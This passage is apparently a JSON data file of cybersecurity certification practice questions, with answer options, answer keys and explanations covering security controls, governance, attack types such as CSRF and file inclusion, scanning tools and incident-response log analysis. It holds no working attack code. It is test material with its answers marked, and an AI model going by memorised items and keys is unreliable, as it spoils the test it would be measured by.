access the database may be able to grant themselves access to the database. Dual control occurs when two employees must jointly authorize the same action. Security through obscurity occurs when the security of a control depends on the secrecy of its mechanism.","l":"c8-controls","l2":"c2-iam","k":"separation of duties authorization"},{"id":"d2-306","set":"d2","ch":8,"d":2,"q":"Which one of the following controls is useful to both facilitate the continuity of operations and serve as a deterrent to fraud?","o":["Succession planning","Dual control","Cross-training","Separation of duties"],"a":2,"e":"Succession planning and cross-training both serve to facilitate continuity of operations by creating a pool of candidates for job vacancies. Of these, only cross-training encompasses actively involving other people in operational processes, which may also help detect fraud. Dual control and separation of duties are both controls that deter fraud, but they do not facilitate the continuity of operations.","l":"c8-controls","l2":"","k":"cross-training operational resilience"},{"id":"d2-307","set":"d2","ch":8,"d":2,"q":"Which one of the following requirements is often imposed by organizations as a way to achieve their original control objective when they approve an exception to a security policy?","o":["Documentation of scope","Limited duration","Compensating control","Business justification"],"a":2,"e":"Organizations may require all of these items as part of an approved exception request. However, the documentation of scope, duration of the exception, and business justification are designed to clearly describe and substantiate the exception request. The compensating control, on the other hand, is designed to ensure that the organization meets the intent and rigor of the original requirement.","l":"c8-governance","l2":"","k":"compensating control exception requirements"},{"id":"d2-308","set":"d2","ch":8,"d":2,"q":"Berta is reviewing the security procedures surrounding the use of a cloud-based online payment service by her company. She set the access permissions for this service so that the same person cannot add funds to the account and transfer funds out of the account. What security principle is most closely related to Berta’s action?","o":["Least privilege","Security through obscurity","Separation of duties","Dual control"],"a":2,"e":"This is an example of separation of duties. Someone who has the ability to transfer funds into the account and issue payments could initiate a very large fund transfer, so Berta has separated these responsibilities into different roles. Separation of duties goes beyond least privilege by intentionally changing jobs to minimize the access that an individual has, rather than granting them the full permissions necessary to perform their job. This is not an example of dual control because a single individual can still perform each action.","l":"c8-controls","l2":"","k":"financial separation of duties"},{"id":"d2-309","set":"d2","ch":8,"d":2,"q":"Thomas found himself in the middle of a dispute between two different units in his business that are arguing over whether one unit may analyze data collected by the other. What type of policy would most likely contain guidance on this issue?","o":["Data ownership policy","Data classification policy","Data retention policy","Account management policy"],"a":0,"e":"Data ownership policies clearly state the ownership of information created or used by the organization. Data classification policies describe the classification structure used by the organization and the process used to properly assign classifications to data. Data retention policies outline what information the organization will maintain and the length of time different categories of information will be retained prior to destruction. Account management policies describe the account life cycle from provisioning through active use and decommissioning.","l":"c8-governance","l2":"","k":"data ownership dispute policy"},{"id":"d2-310","set":"d2","ch":8,"d":2,"q":"Mara is designing a new data mining system that will analyze access control logs for signs of unusual login attempts. Any suspicious logins will be automatically locked out of the system. What type of control is Mara designing?","o":["Physical control","Operational control","Managerial control","Technical control"],"a":3,"e":"The automatic blocking of logins is a technical activity, and this is, therefore, a technical control. Physical controls are security controls that impact the physical world. Operational controls include the processes that we put in place to manage technology in a secure manner. Managerial controls are procedural mechanisms that an organization follows to implement sound security management practices.","l":"c8-controls","l2":"","k":"automated technical login blocking"},{"id":"d2-311","set":"d2","ch":8,"d":2,"q":"Which one of the following elements is <i>least</i> likely to be found in a data retention policy?","o":["Minimum retention period for data","Maximum retention period for data","Description of information to retain","Classification of information elements"],"a":3,"e":"Data retention policies describe what information the organization will maintain and the length of time different categories of information will be retained prior to destruction, including both minimum and maximum retention periods. Data classification would be covered by the data classification policy.","l":"c8-governance","l2":"","k":"data retention policy components"},{"id":"d2-312","set":"d2","ch":6,"d":2,"q":"Kevin leads the IT team at a small business and does not have a dedicated security team. He would like to develop a security baseline of his organization’s system configurations but does not have a team of security experts available to assist him. Which of the following is the most appropriate tool for Kevin to use?","o":["Penetration testing tool","Patch management tool","Vulnerability scanning tool","Network monitoring tool"],"a":2,"e":"A vulnerability scanner is the most appropriate tool for Kevin to use to conduct security baseline scans. Vulnerability scanners are automated tools that can identify known vulnerabilities and misconfigurations on a system. They can scan a wide range of systems, including servers, workstations, and network devices. They are designed to be easy to use, even for IT professionals who are not security experts.\n<p>Kevin might be able to obtain similar information using a penetration testing tool, but those tools tend to require skilled cybersecurity professionals to operate and analyze the results.</p>\n<p>Patch management and network monitoring tools are useful security tools, but they do not develop a baseline of system configurations.</p>","l":"c6-tools","l2":"","k":"vulnerability scanning baseline tool"},{"id":"d2-313","set":"d2","ch":6,"d":2,"q":"Jenna is helping her organization choose a set of security standards that will be used to secure a variety of operating systems. She is looking for industry guidance on the appropriate settings to use for Windows and Linux systems. Which one of the following tools will serve as the best resource?","o":["ISO 27001","OWASP","PCI DSS","CIS benchmarks"],"a":3,"e":"All of these resources provide valuable information to security professionals seeking to design a security program according to industry standards. However, only the Center for Internet Security (CIS) provides detailed baseline standards that include step-by-step instructions for configuring systems to meet specific security requirements. The CIS benchmarks are widely used as a resource for securing systems in various industries.\n<p>ISO 27001 is a standard for information security management systems (ISMS). While it may include some guidance on securing systems, it is not specific to Windows or Linux and is more focused on overall information security management.</p>\n<p>Open Worldwide Application Security Project (OWASP) is a nonprofit organization that provides a variety of resources for web application security, including a list of the top 10 most critical web application security risks. While it may include some guidance on securing systems, it is not specific to Windows or Linux and is more focused on web application security.</p>\n<p>Payment Card Industry Data Security Standard (PCI DSS) is a standard for securing credit and debit card information. There is no indication in the scenario that Jenna’s organization handles credit or debit card data, so this would not be an appropriate standard for her to use.</p>","l":"c6-requirements","l2":"c8-governance","k":"CIS benchmarks security configuration"},{"id":"d2-314","set":"d2","ch":5,"d":2,"q":"Linda is attempting to configure Angry IP Scanner on her Linux scanning workstation and is receiving errors about missing required software. What component must be installed prior to using Angry IP Scanner?","o":["<code>nmap</code>","Java","<code>gcc</code>","Nessus"],"a":1,"e":"The Angry IP scanner is a multiplatform tool that is written in the Java language. It does require a Java runtime to function properly. It does not require other scanning tools, such as <code>nmap</code> or Nessus. It also does not require a C compiler, such as <code>gcc</code>.","l":"c5-portscan","l2":"","k":"Angry IP Scanner Java dependency"},{"id":"d2-315","set":"d2","ch":8,"d":2,"q":"A critical vulnerability is identified on a proprietary system that supports a revenue-generating process. The vendor has no patch available, and taking the system offline is not currently feasible. The security team still needs to reduce risk while the issue remains open.\n<p>What should the analyst recommend?</p>","o":["Create a documented exception and implement compensating controls.","Defer consideration until the next review cycle to allow time for the situation to change.","Close the finding as a false positive.","Transfer the risk by purchasing insurance."],"a":0,"e":"Creating a documented exception and implementing compensating controls is appropriate because the vulnerability is real and cannot be directly patched, and the system cannot be taken offline, so the organization needs a formal decision that acknowledges the risk while adding protective measures such as tighter network controls, monitoring, or access restrictions to reduce likelihood and impact. Deferring consideration until a future review cycle leaves a known critical issue unaddressed and provides no interim risk reduction. Closing the finding as a false positive would misrepresent the situation, since the vulnerability exists and the concern is about how to handle it, not whether it is genuine. Transferring risk by purchasing insurance can help with financial impact but does not reduce the technical exposure or likelihood of compromise, so it is not a sufficient primary response to a critical unpatched vulnerability on a key revenue system.","l":"c8-governance","l2":"c6-remediation","k":"documented exception compensating controls"},{"id":"d2-316","set":"d2","ch":6,"d":2,"q":"Jim is working with Metasploit as part of his testing effort. What should Jim expect to occur when Metasploit is used?","o":["Systems will be scanned for vulnerabilities.","Systems will have known vulnerabilities exploited.","Services will be probed for buffer overflow and other unknown flaws.","Systems will be tested for zero-day exploits."],"a":1,"e":"Metasploit is an exploitation package that is designed to assist testers. A tester using Metasploit can exploit known vulnerabilities for which an exploit has been created or can create their own exploits using the tool. While Metasploit provides built-in access to some vulnerability scanning functionality, a tester using Metasploit should primarily be expected to perform actual tests of exploitable vulnerabilities. Similarly, Metasploit supports creating buffer overflow attacks, but it is not a purpose-built buffer overflow testing tool, and of course testing systems for zero-day exploits doesn’t work unless they have been released.","l":"c6-tools","l2":"c1-endpoint-pentest","k":"Metasploit exploit reliability"},{"id":"d2-317","set":"d2","ch":5,"d":2,"q":"Which one of the following best describes recon-ng as a security tool?","o":["Vulnerability scanner","Web application reconnaissance tool","Network mapper","Password cracker"],"a":1,"e":"Recon-ng is an automated web application reconnaissance tool that helps testers and attackers discover information about a web environment in advance of trying to exploit that environment.","l":"c5-portscan","l2":"c5-recon","k":"Recon-ng web reconnaissance tool"},{"id":"d2-318","set":"d2","ch":7,"d":2,"q":"Ashley is investigating an attack that compromised an account of one of her users. In the attack, the attacker forced the submission of an authenticated request to a third-party site by exploiting trust relationships in the user’s browser. What type of attack most likely took place?","o":["XSS","CSRF","SQL injection","Session hijacking"],"a":1,"e":"Cross-site request forgery (XSRF or CSRF) attacks exploit the trust that sites have in a user’s browser by attempting to force the submission of authenticated requests to third-party sites. Cross-site scripting (XSS) uses reflected input to trick a user’s browser into executing untrusted code from a trusted site. SQL injection directly attacks a database through a web application. Session hijacking attacks attempt to steal previously authenticated sessions but do not force the browser to submit requests.","l":"c7-web-ot","l2":"","k":"cross-site request forgery trust"},{"id":"d2-319","set":"d2","ch":7,"d":2,"q":"Juanita is a cybersecurity professional who works with data scientists at a company that uses machine learning (ML) models to predict customer behavior. She believes that their work has been the target of a data poisoning attack. Which of the following actions should she take to address the situation?","o":["Ignore the problem as it is unlikely to have an operational effect.","Remove affected data from the training dataset and generate a new model.","Generate a new model using the same dataset and machine learning algorithm.","Generate a new model using the same dataset and a different machine learning algorithm."],"a":1,"e":"Data poisoning, the act of injecting false or misleading data into a machine learning model’s training dataset, can cause the model to make incorrect predictions or decisions. By removing the false data and retraining the model, Juanita can ensure that the model is not basing its predictions or decisions on faulty or malicious data.\n<p>Juanita should not ignore the problem because it is likely to have had an effect on the accuracy of the model. She should not use the same dataset to generate a new model (regardless of algorithm choice) because that model would still be based on the poisoned data.</p>","l":"c7-web-ot","l2":"c1-ai","k":"machine learning data poisoning"},{"id":"d2-320","set":"d2","ch":8,"d":2,"q":"Joshua is concerned about insecure software design practices and is developing a software threat modeling program for his organization. Which of the following is not an appropriate goal for this program?","o":["To reduce the number of security-related design flaws","To reduce the number of security-related coding flaws","To reduce the severity of non-security-related flaws","To reduce the number of threat vectors"],"a":3,"e":"Software threat modeling is designed to reduce the number of security-related design and coding flaws as well as the severity of other flaws. The developer or evaluator of software has no control over the threat environment, because it is external to the organization.","l":"c8-sdlc","l2":"c8-managing","k":"software threat modeling benefits"},{"id":"d2-321","set":"d2","ch":8,"d":2,"q":"Gavin works as a cybersecurity analyst and notices that issues continually arise in his organization where system administrators modify system configuration files without providing advance notice to other teams. In several situations, this resulted in a security misconfiguration. What control would best prevent these issues from recurring in the future?","o":["Change management program","Security-enhanced operating system","Configuration lockdown","File integrity monitoring"],"a":0,"e":"There are many potential solutions to this problem. Locking down configurations might prevent unauthorized changes, but it would also likely disrupt authorized changes. File integrity monitoring (FIM) systems may identify an unauthorized change but only after it occurred. A security-enhanced operating system is designed to implement advanced security controls and does not address this specific risk.\n<p>The underlying problem here is that system administrators are making changes without properly coordinating them with other teams. A strong change management program would directly address this root cause.</p>","l":"c8-controls","l2":"c8-governance","k":"configuration change management program"},{"id":"d2-322","set":"d2","ch":7,"d":2,"q":"Brenda maintains a web application and learned that the application contains a remote code execution vulnerability that is triggered by sending a carefully crafted message to a logging service that runs on the underlying server. What action should Brenda take to best address this risk?","o":["Modify the code of the web application to eliminate the vulnerability.","Install an intrusion detection system.","Check for and apply patches from the logging vendor.","Ignore the issue because the logging service is not her responsibility."],"a":2,"e":"The vulnerability that exists in this situation is in the code for the logging service. Modifying the code of the web application is unlikely to correct this problem. The code of the underlying logging service is the issue, so Brenda should check for a patch from the vendor who created that service and apply the patch promptly.\n<p>An intrusion detection system would only identify that the vulnerability was being exploited and not correct the issue.</p>\n<p>Brenda should not ignore this issue as remote code execution vulnerabilities are extremely serious.</p>","l":"c7-server-network","l2":"c8-appsec","k":"logging library vulnerability patching"},{"id":"d2-323","set":"d2","ch":7,"d":2,"q":"Viola is analyzing an attack that occurred against her organization. The attacker was able to manipulate a web application to display a confidential data file that was stored on the server by traversing the directory structure in the URL. What term best describes this type of attack?","o":["SQL injection","Server-side request forgery","Local file inclusion","Remote file inclusion"],"a":2,"e":"You might find this question a little confusing because the scenario seems to describe a directory traversal attack and that is not one of the answer choices. The key to successfully answering this question is understanding that a directory traversal attack is a type of local file inclusion (LFI) attack. LFI attacks allow a remote user to access files stored on a server. Directory traversal achieves the attacker’s goal of LFI by navigating the directory structure with navigation commands such as<code>..</code> and <code>/</code> in the URL. Remote file inclusion (RFI) attacks use a similar approach but allow the attacker to execute code that is hosted on their own computer using the targeted server.","l":"c7-web-ot","l2":"","k":"local file inclusion exploit"},{"id":"d2-324","set":"d2","ch":8,"d":2,"q":"Melissa is concerned that users in her organization are connecting to corporate systems over insecure networks and begins a security awareness campaign designed to encourage them to use the VPN. What category of control has Melissa implemented?","o":["Compensating","Technical","Physical","Administrative"],"a":3,"e":"Security awareness training is an example of an administrative security control because it is an administrative practice. The subject of the training is the use of the VPN, which is a technical control, but the training itself is administrative in nature.","l":"c8-controls","l2":"","k":"security awareness administrative control"},{"id":"d2-325","set":"d2","ch":8,"d":2,"q":"The company Chris works for has notifications posted at each door reminding employees to be careful not to allow people to enter when they do. Which type of control is this?","o":["Detective","Responsive","Administrative","Corrective"],"a":2,"e":"Notifications and procedures like the signs posted at the company Chris works for are examples of administrative controls because they are designed to remind employees not to allow unauthorized individuals to enter. They do not identify security incidents, as a detective control would. They do not respond to active security incidents, as a responsive control would, and they do not correct the effects of a security incident, as a corrective control would.","l":"c8-controls","l2":"c8-governance","k":"policy reminder administrative controls"},{"id":"d2-326","set":"d2","ch":8,"d":2,"q":"Kevin has discovered a security vulnerability in one of his organization’s business-critical systems. He evaluates the situation and determines that it presents a low risk to the organization but would like to correct it. There is a patch available from the vendor. When should Kevin plan to apply the patch?","o":["Immediately","During the next scheduled maintenance window","As soon as possible outside of normal business hours","During the next major system upgrade"],"a":1,"e":"A maintenance window is a period of time during which routine maintenance and updates are scheduled to be performed on systems, devices, and infrastructure. This can include software updates, security patches, hardware replacements, and other types of maintenance activities. This is a low-risk vulnerability, so Kevin can wait until the next maintenance window to apply it.","l":"c8-controls","l2":"c6-remediation","k":"scheduled maintenance window patching"},{"id":"d2-327","set":"d2","ch":8,"d":2,"q":"Ben is responsible for the security of payment card information stored in a database. Policy directs that he remove the information from the database, but he cannot do this for operational reasons. He obtained an exception to policy and is seeking an appropriate compensating control to mitigate the risk. What would be his best option?","o":["Purchasing insurance","Encrypting the database contents","Removing the data","Objecting to the exception"],"a":1,"e":"Ben should encrypt the data to provide an additional layer of protection as a compensating control. The organization has already made a policy exception, so he should not react by objecting to the exception or removing the data without authorization. Purchasing insurance may transfer some of the risk but is not a mitigating control.","l":"c8-governance","l2":"c2-crypto","k":"database encryption compensating control"},{"id":"d2-328","set":"d2","ch":2,"d":2,"q":"Isabelle wants to prevent privilege escalation attacks via her organization’s service accounts. Which of the following security practices is best suited to this?","o":["Remove unnecessary rights.","Disable interactive login for service accounts.","Limit when accounts can log in.","Use meaningless or randomized names for service accounts."],"a":0,"e":"The most important step in securing service accounts is to ensure that they have only the rights that are absolutely needed to accomplish the task they are designed for. Disabling interactive logins is important as well and would be the next best answer. Limiting when accounts can log in and using randomized or meaningless account names can both be helpful in some circumstances but are far less important.","l":"c2-iam","l2":"c7-server-network","k":"service account least privilege"},{"id":"d2-329","set":"d2","ch":5,"d":2,"q":"Brandon is validating the security of systems and devices in his organization, but he is permitted to use only passive techniques. Which one of the following actions would be considered passive discovery?","o":["Monitoring network traffic and analyzing the contents for signs of unpatched systems and applications","Running vulnerability scans of an organization’s servers","Running port scans of an organization’s servers","Using carefully scoped penetration testing techniques to identify vulnerabilities"],"a":0,"e":"Passive discovery techniques involve no interaction with the target system. Monitoring network traffic would, therefore, be a passive technique because it does not actively engage the target system.\n<p>Vulnerability scanners, port scanners, and penetration testing techniques are active tools that directly interact with the target system.</p>","l":"c5-recon","l2":"c6-requirements","k":"passive network traffic discovery"},{"id":"d2-330","set":"d2","ch":8,"d":2,"q":"Ryan’s organization wants to ensure that proper account management is occurring but does not have a central identity and access management tool in place. Ryan has a limited amount of time to do his verification process. What is his best option to test the account management process as part of an internal audit?","o":["Validate all accounts changed in the past 90 days.","Select high value administrative accounts for validation.","Validate all accounts changed in the past 180 days.","Validate a random sample of accounts."],"a":3,"e":"Random sampling of accounts is the recommended best practice if all accounts cannot be validated. Selecting only recently changed accounts will not identify long-term issues or historic issues, and checking only high-value accounts will not show if there are issues or bad practices with other account types.","l":"c8-controls","l2":"c2-iam","k":"random sample account auditing"},{"id":"d2-331","set":"d2","ch":8,"d":2,"q":"Which one of the following security testing programs is designed to attract the participation of external testers and incentivize them to uncover security flaws?","o":["Penetration test","Internal vulnerability scan","Bug bounty","External vulnerability scan"],"a":2,"e":"Bug bounty programs are specifically designed to solicit bug reports from external security testers. Vulnerability scans (whether internal or external) and penetration tests are run by, or on behalf of, an organization’s own security team.","l":"c8-appsec","l2":"c1-endpoint-pentest","k":"bug bounty security programs"},{"id":"d2-332","set":"d2","ch":2,"d":2,"q":"Frank’s team is testing a new API that his company’s developers have built for their application infrastructure. Which of the following is not a common API issue that you would expect Frank’s team to find?","o":["Improper encryption","Object-level authorization issues","User authentication issues","Lack of rate limiting"],"a":0,"e":"APIs typically transfer data for web application via HTTPS, meaning that the API itself is not responsible for encryption. If Frank’s team discovers that TLS is not enabled, they will need to work with the infrastructure or systems administration team to ensure that TLS is enabled and in use rather than making API changes. Authorization for object access, authentication weaknesses, and rate limiting are all common API issues.","l":"c2-infra","l2":"c7-web-ot","k":"API transport encryption responsibility"},{"id":"d2-333","set":"d2","ch":8,"d":2,"q":"Ryan is considering the use of fuzz testing in his web application testing program. Which one of the following statements about fuzz testing is true?","o":["Fuzzers find only complex faults.","Testers must manually generate input.","Fuzzers may not fully cover the code.","Fuzzers can’t reproduce errors."],"a":2,"e":"Fuzz testers are capable of automatically generating input sequences to test an application. Therefore, testers do not need to manually generate input, although they may do so if they wish. Fuzzers can reproduce errors (and thus, “fuzzers can’t reproduce errors” is not an issue) but typically don’t fully cover the code—code coverage tools are usually paired with fuzzers to validate how much coverage was possible. Fuzzers are often limited to simple errors because they won’t handle business logic or attacks that require knowledge from the application user.","l":"c8-appsec","l2":"","k":"fuzz testing code coverage"},{"id":"d3-1","set":"d3","ch":9,"d":3,"q":"Consider the threat modeling analysis shown here. What attack framework was used to develop this analysis?\n<figure><img alt=\"Diagram depicts the diamond model linking adversary, capability, victim, and infrastructure, with arrows for 5 investigative steps.\" loading=\"lazy\" src=\"img/pt/c03fun001.png\"/></figure>","o":["MITRE ATT&amp;CK","Cyber Kill Chain","STRIDE","Diamond Model of Intrusion Analysis"],"a":3,"e":"This analysis used the Diamond model of intrusion analysis, which describes a sequence where an adversary deploys a capability targeted at an infrastructure against a victim. The Diamond model draws its name from the shape of the diagram created during the analysis.","l":"c9-frameworks","l2":"","k":"Diamond Model of Intrusion Analysis"},{"id":"d3-2","set":"d3","ch":7,"d":3,"q":"As part of an organization-wide red team exercise, Frank is able to use a known vulnerability to compromise an Apache web server. Frank knows that the Apache service is running under a limited user account. Once he has gained access, what should his next step be if he wants to use the system to pivot to protected systems behind the screened subnet (DMZ) that the web server resides in?","o":["Vulnerability scanning","Privilege escalation","Patching","Installing additional tools"],"a":1,"e":"By default, Apache does not run as an administrative user. In fact, it typically runs as a limited user. To take further useful action, Frank should look for a privilege escalation path that will allow him to gain further access.","l":"c7-server-network","l2":"c1-endpoint-pentest","k":"privilege escalation technique"},{"id":"d3-3","set":"d3","ch":9,"d":3,"q":"Helen is using the Lockheed Martin Cyber Kill Chain to analyze an attack that took place against her organization. During the attack, the perpetrator attached a malicious tool to an email message that was sent to the victim. What phase of the Cyber Kill Chain includes this type of activity?","o":["Weaponization","Delivery","Exploitation","Actions on objectives"],"a":1,"e":"Delivery occurs when the adversary deploys their tool either directly against targets or via release that relies on staff at the target interacting with it such as in an email payload, on a USB stick, or via websites that they visit.","l":"c9-frameworks","l2":"","k":"Cyber Kill Chain delivery phase"},{"id":"d3-4","set":"d3","ch":3,"d":3,"q":"Betty wants to review the security logs on her Windows workstation. What tool should she use to do this?","o":["<code>secpol.msc</code>","Event Viewer","Log Viewer","<code>logview.msc</code>"],"a":1,"e":"The Windows Event Viewer (<code>eventvwr.msc</code>) is a built-in tool for Windows systems that can be used to view application, security, setup, system, and other events and logs. <code>secpol.msc</code> is the Local Security Policy snap-in, and <code>logview.msc</code> is not a built-in Windows tool or a snap-in.","l":"c3-tools","l2":"c2-logging","k":"Windows Event Viewer"},{"id":"d3-5","set":"d3","ch":9,"d":3,"q":"The ATT&amp;CK framework defines which of the following as “the specifics behind how the adversary would attack the target?”","o":["The threat actor","The targeting method","The attack vector","The organizational weakness"],"a":2,"e":"The MITRE ATT&amp;CK framework defines the attack vector as the specifics behind how the adversary would attack the target. You don’t have to memorize ATT&amp;CK to pass the exam, but you should be prepared to encounter questions that you need to narrow down based on what knowledge you do have. Here you can rule out the threat actor and targeting method and then decide between the attack vector and organizational weakness.","l":"c9-frameworks","l2":"","k":"MITRE ATT&CK framework"},{"id":"d3-6","set":"d3","ch":9,"d":3,"q":"Jamal wants to leverage a framework to improve his threat hunting for network defense. What tool should he select to help his team categorize and analyze threats more effectively?","o":["MOPAR","CVSS","MITRE ATT&amp;CK","CAPEC"],"a":2,"e":"The MITRE ATT&amp;CK framework is focused on network defense and broadly covers threat hunting. CAPEC is focused on application security. CVSS is the Common Vulnerability Scoring System, and Mopar is a parts, service, and customer care organization that is part of Fiat Chrysler.","l":"c9-frameworks","l2":"c4-hunt","k":"MITRE ATT&CK threat hunting"},{"id":"d3-7","set":"d3","ch":11,"d":3,"q":"Maria is an Active Directory domain administrator for her company, and she knows that a quickly spreading botnet relies on a series of domain names for command and control and that preventing access to those domain names will cause the malware infection that connects to the botnet to fail to take further action. Which of the following actions is her best option if she wants to prevent offsite Windows users from connecting to botnet command-and-control systems?","o":["Force a BGP update.","Set up a DNS sinkhole.","Modify the hosts file.","Install an antimalware application."],"a":2,"e":"Maria can push an updated hosts file to her domain connected systems that will direct traffic intended for known bad domains to the localhost or a safe system. She might want to work with a security analyst or other IT staff member to capture queries sent to that system to track any potentially infected workstations. A DNS sinkhole would work only if all of the systems were using local DNS, and offsite users are likely to have DNS settings set by the local networks they connect to. Antimalware applications may not have an update yet or may fail to detect the malware, and forcing a Border Gateway Protocol (BGP) update for third-party networks is likely a bad idea.","l":"c11-contain","l2":"c3-tip-edr","k":"hosts file DNS sinkholing"},{"id":"d3-8","set":"d3","ch":11,"d":3,"q":"An organization detects suspicious authentication attempts against a critical SaaS admin account. The incident commander’s first priority is to limit ongoing damage while the team continues investigating indicators of compromise.\n<p>Which incident response phase is being performed when the team temporarily disables the affected account, blocks the source IPs, and isolates impacted endpoints?</p>\n<p><a href=\"#Ques9\">Questions 9</a>–<a href=\"#Ques12\">12</a> refer to the following scenario:</p>\n<p>Bill is reviewing the authentication logs for a Linux system that he operates and encounters the following log entries:</p>\n<pre>\n<code>Aug 30 09:46:54 ip-172-30-0-62 sshd[3051]: Accepted publickey for ec2-user from 10.174.238.88 port 57478 ssh2: RSA e5:f5:c1:46:bb:49:a1:43:da:9d:50:c5:37:bd:79:22</code>\n<code>Aug 30 09:46:54 ip-172-30-0-62 ssh[3051]: pam_unix[sshd:session]: session opened for user ec2-user by (uid=0)</code>\n<code>Aug 30 09:48:06 ip-172-30-0-62 sudo: ec2-user : TTY=ps/0 ; PWD=/home/ec2-user ; USER=root; COMMAND=/bin/bash</code>\n</pre>","o":["Recovery","Eradication","Containment","Post-Incident Activities"],"a":2,"e":"Containment is being performed here because the focus is on limiting ongoing damage and stopping the attacker’s current access by disabling the compromised account, blocking the hostile IP addresses, and isolating affected endpoints, all of which are classic short-term damage control actions taken while investigation continues. Recovery would involve restoring normal operations, reenabling accounts, and bringing systems safely back into production after the threat has been neutralized. Eradication centers on removing the root cause of the compromise, such as deleting malware, closing exploited vulnerabilities, or removing persistence mechanisms, which is not what is described. Post-incident activities come after the incident is resolved and involve documentation, lessons learned, and improvements to processes and controls rather than active defensive measures during the event.","l":"c11-contain","l2":"","k":"incident containment phase"},{"id":"d3-9","set":"d3","ch":3,"d":3,"q":"What is the IP address of the system where the user was logged in when they initiated the connection?","o":["172.30.0.62","62.0.30.172","10.174.238.88","9.48.6.0"],"a":2,"e":"The first entry in the log indicates that the user authenticated from the system 10.174.238.88.","l":"c3-tools","l2":"c10-analysis","k":"SSH authentication log analysis"},{"id":"d3-10","set":"d3","ch":3,"d":3,"q":"What service did the user use to connect to the server?","o":["HTTPS","PTS","SSH","Telnet"],"a":2,"e":"The second log entry indicates that the <code>sshd</code> daemon handled the connection. This daemon supports the Secure Shell (SSH) protocol.","l":"c3-tools","l2":"c10-analysis","k":"SSH service identification"},{"id":"d3-11","set":"d3","ch":3,"d":3,"q":"What authentication technique did the user use to connect to the server?","o":["Password","PKI","Token","Biometric"],"a":1,"e":"The first log entry indicates that the user made use of public key encryption (PKI) to authenticate the connection. The user, therefore, possessed the private key that corresponded to a public key stored on the server and associated with the user.","l":"c3-tools","l2":"c2-crypto","k":"SSH public key authentication"},{"id":"d3-12","set":"d3","ch":3,"d":3,"q":"What account did the individual use to connect to the server?","o":["root","<code>ec2-user</code>","bash","<code>pam_unix</code>"],"a":1,"e":"The identity of the user making the connection appears in the first log entry: <code>accepted publickey for ec2-user</code>. The third log entry that contains the string <code>USER=root</code> is recording the fact that the user issued the <code>sudo</code> command to create an interactive Bash shell with administrative privileges. This is not the account used to create the server connection. The <code>pam_unix</code> entry indicates that the session was authenticated using the pluggable authentication module (PAM) facility.","l":"c3-tools","l2":"c10-analysis","k":"SSH log user identification"},{"id":"d3-13","set":"d3","ch":1,"d":3,"q":"Alaina adds the <code>openphish</code> URL list to her SOAR tool and sees the following entries. What action should she take based on phishing URLs like these?<pre>\n<code>http://13.126.65.8/DocExaDemo/uploads/index.php/bofa/bofa/95843de35406f3cab0b2dcf2b/success.htm</code>\n<code>http://13.126.65.8/DocExaDemo/uploads/index.php/bofa/bofa/9b094075409d3a723c7ee3d9e/sitekey.php</code>\n<code>http://13.126.65.8/DocExaDemo/uploads/index.php/bofa/bofa/9b094075409d3a723c7ee3d9e/success.htm</code>\n<code>http://13.126.65.8/DocExaDemo/uploads/index.php/bofa/bofa/9b094075409d3a723c7ee3d9e/</code>\n<code>http://13.126.65.8/DocExaDemo/uploads/index.php/bofa/bofa/95843de35406f3cab0b2dcf2b/</code>\n<code>http://13.126.65.8/DocExaDemo/uploads/index.php/bofa/bofa/95843de35406f3cab0b2dcf2b/sitekey.php</code>\n</pre>","o":["Block the IP address at her border firewall.","Monitor for the IP address using her IDS.","Delete emails with the URL from inbound email.","Nothing, as these have not been confirmed."],"a":2,"e":"Alaina’s best option is to delete emails with these URLs from all inbound email. Blocking or monitoring for the IP addresses can help, but mobile and offsite users will not be protected if they do not send their traffic through her firewall or IDSs.","l":"c1-efficiency","l2":"c3-filesandbox","k":"SOAR email phishing automation"},{"id":"d3-14","set":"d3","ch":11,"d":3,"q":"After containing a business email compromise incident by resetting the affected executive’s credentials and revoking active sessions, Kris wants to confirm that the threat actor has not established a secondary access path. He configures alerts for new inbox forwarding rules, OAuth application grants, and login attempts from the attacker’s previously observed IP ranges. Which incident response technique is Kris applying?\n<p><a href=\"#Ques15\">Questions 15</a>–<a href=\"#Ques17\">17</a> refer to the following scenario and table:</p>\n<p>The U.S. Cybersecurity and Infrastructure Security Agency (CISA) uses a 1–100 scale for incident prioritization, with weight assigned to each of a number of categories. The functional impact score is weighted in their demonstration as follows:</p>\n<figure><table><thead><tr><th class=\"td-L\" scope=\"col\">Functional Impact</th><th class=\"td-L\" scope=\"col\">Rating</th></tr></thead><tbody><tr><td class=\"td-L\">No impact</td><td class=\"td-L\">0</td></tr><tr><td class=\"td-L\">No impact to services</td><td class=\"td-L\">20</td></tr><tr><td class=\"td-L\">Minimal impact to noncritical services</td><td class=\"td-L\">35</td></tr><tr><td class=\"td-L\">Minimal impact to critical services</td><td class=\"td-L\">40</td></tr><tr><td class=\"td-L\">Significant impact to noncritical services</td><td class=\"td-L\">50</td></tr><tr><td class=\"td-L\">Denial of noncritical services</td><td class=\"td-L\">60</td></tr><tr><td class=\"td-L\">Significant impact to critical services</td><td class=\"td-L\">70</td></tr><tr><td class=\"td-L\">Denial of critical services or loss of control</td><td class=\"td-L\">100</td></tr></tbody></table></figure>","o":["Continuous monitoring","Triage","Eradication","Escalation"],"a":0,"e":"The team is applying continuous monitoring because they are actively watching for signs that the attacker retained or reestablished access after containment actions were taken, using targeted alerts based on known indicators. Triage is the initial prioritization and classification of an alert or incident, which has already occurred. Eradication involves removing the root cause, such as deleting persistence mechanisms or closing exploited vulnerabilities, rather than observing for recurrence. Escalation involves raising the incident to higher authority or additional teams for decision-making, which is not what is being described.","l":"c11-recover","l2":"","k":"post recovery continuous monitoring"},{"id":"d3-15","set":"d3","ch":10,"d":3,"q":"Nathan discovers a malware package on an end-user workstation. What rating should he give this if he is considering organization impact based on the table shown?","o":["No impact","No impact to services","Denial of noncritical services","Denial of critical services or loss of control"],"a":1,"e":"It may be tempting to answer “no impact,” but the better answer here is “no impact to services.” The system will still require remediation, which will consume staff time, so there will not be a total lack of impact.","l":"c10-evidence","l2":"","k":"incident functional impact rating"},{"id":"d3-16","set":"d3","ch":10,"d":3,"q":"Nathan’s organization uses a software-as-a-service (SaaS) tool to manage their customer mailing lists, which they use to inform customers of upcoming sales a week in advance. The organization’s primary line of business software continues to function and merchandise can be sold. Because of a service outage, they are unable to add new customers to the list for a full business day. How should Nathan rate this local impact issue during the outage?","o":["Minimal impact to noncritical services","Minimal impact to critical services","Significant impact to noncritical services","Denial of noncritical services"],"a":3,"e":"The service is noncritical because it can be used to conduct business as usual after it is restored without a meaningful business impact due to the outage. During the outage, however, this is a denial of a noncritical service.","l":"c10-evidence","l2":"","k":"functional impact noncritical 